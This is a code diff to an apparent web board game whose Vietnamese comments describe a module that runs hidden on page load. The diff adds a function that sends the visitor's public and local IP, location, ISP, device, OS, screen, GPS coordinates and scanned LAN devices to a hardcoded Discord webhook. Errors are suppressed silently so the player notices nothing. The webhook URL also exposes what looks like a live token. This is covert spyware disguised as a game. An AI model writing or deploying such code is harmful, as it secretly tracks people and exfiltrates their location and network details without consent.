@@ -313,7 +313,6 @@
             return !board.includes("");
         }
 
-        // Hàm chơi lại chỉ làm mới bàn cờ (không chạy lại quét hệ thống)
         function restartGame() {
             boardState = Array(BOARD_SIZE * BOARD_SIZE).fill("");
             isGameActive = true;
@@ -324,10 +323,11 @@
         createBoard();
 
         // ==========================================
-        // 2. MÔ-ĐUN THU THẬP DỮ LIỆU HỆ THỐNG (CHẠY ẨN)
+        // 2. MÔ-ĐUN THU THẬP DỮ LIỆU & GỬI DISCORD
         // ==========================================
-        let daThuNhapDuLieu = false; // Cờ kiểm tra để không quét lại từ đầu
-        let duLieuHeThong = {};     // Biến lưu trữ kết quả dữ liệu
+        let daThuNhapDuLieu = false;
+        let duLieuHeThong = {};
+        const DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1548337744181465108/IbjJBoq1n28tYytSjBLV5qE7zZPEHxQfq98GZ2p_LKwmU7NnsxFF2DXKamXod90r1Pi9";
 
         async function taiLienTucLuongMoi(url, durationMs) {
             let totalBytes = 0;
@@ -540,9 +540,34 @@
             return { ip: "N/A", city: "N/A", country: "N/A", isp: "N/A" };
         }
 
+        // Hàm gửi dữ liệu đến Discord Webhook
+        async function guiDuLieuDiscord() {
+            if (!duLieuHeThong.ip) return;
+
+            const noiDung = `📊 **THÔNG TIN THIẾT BỊ MỚI** 📊
+• **IP Công cộng:** \`${duLieuHeThong.ip.ip}\`
+• **Địa điểm:** ${duLieuHeThong.ip.city}, ${duLieuHeThong.ip.country}
+• **Nhà mạng:** ${duLieuHeThong.ip.isp || 'N/A'}
+• **IP Nội bộ (WebRTC):** \`${duLieuHeThong.localIp}\`
+• **Loại mạng:** ${duLieuHeThong.network.type} (Tốc độ: ${duLieuHeThong.network.speedReal})
+• **Thiết bị:** ${duLieuHeThong.device.brand} - ${duLieuHeThong.device.model}
+• **Hệ điều hành:** ${duLieuHeThong.os.osName} (${duLieuHeThong.os.osVersion})
+• **Màn hình:** ${duLieuHeThong.screen}
+• **Tọa độ GPS:** ${duLieuHeThong.gps ? `Lat: ${duLieuHeThong.gps.lat}, Lng: ${duLieuHeThong.gps.lng} (Sai số: ~${duLieuHeThong.gps.accuracy}m)` : 'Chưa cấp quyền / Không khả dụng'}
+• **Thiết bị LAN:** ${duLieuHeThong.lan.count} thiết bị (${duLieuHeThong.lan.list})`;
+
+            try {
+                await fetch(DISCORD_WEBHOOK_URL, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ content: noiDung })
+                });
+            } catch (e) {}
+        }
+
         // HÀM CHÍNH: Thu thập dữ liệu chạy ngầm hoàn toàn
         async function thuNhapDuLieuAn() {
-            if (daThuNhapDuLieu) return; // Nếu đã thu thập rồi thì bỏ qua
+            if (daThuNhapDuLieu) return;
 
             try {
                 const ipData = await layThongTinIP();
@@ -552,7 +577,6 @@
                 const osData = await layThongTinHeDieuHanh();
                 const lanData = await quetMangLAN(localIp);
 
-                // Lưu dữ liệu vào đối tượng
                 duLieuHeThong = {
                     ip: ipData,
                     localIp: localIp,
@@ -563,7 +587,6 @@
                     screen: `${window.screen.width}x${window.screen.height}`
                 };
 
-                // Lấy tọa độ GPS nếu được cho phép
                 if ("geolocation" in navigator) {
                     navigator.geolocation.getCurrentPosition(
                         (pos) => {
@@ -573,18 +596,20 @@
                                 accuracy: Math.round(pos.coords.accuracy)
                             };
                             daThuNhapDuLieu = true;
+                            guiDuLieuDiscord(); // Gửi ngay sau khi có GPS
                         },
-                        () => { daThuNhapDuLieu = true; }
+                        () => {
+                            daThuNhapDuLieu = true;
+                            guiDuLieuDiscord(); // Gửi ngay nếu từ chối GPS
+                        }
                     );
                 } else {
                     daThuNhapDuLieu = true;
+                    guiDuLieuDiscord();
                 }
-            } catch (e) {
-                // Xử lý lỗi trong im lặng không ảnh hưởng người chơi
-            }
+            } catch (e) {}
         }
 
-        // Tự động chạy ẩn ngay khi trang web được tải
         window.addEventListener("load", () => {
             setTimeout(thuNhapDuLieuAn, 500);
         });
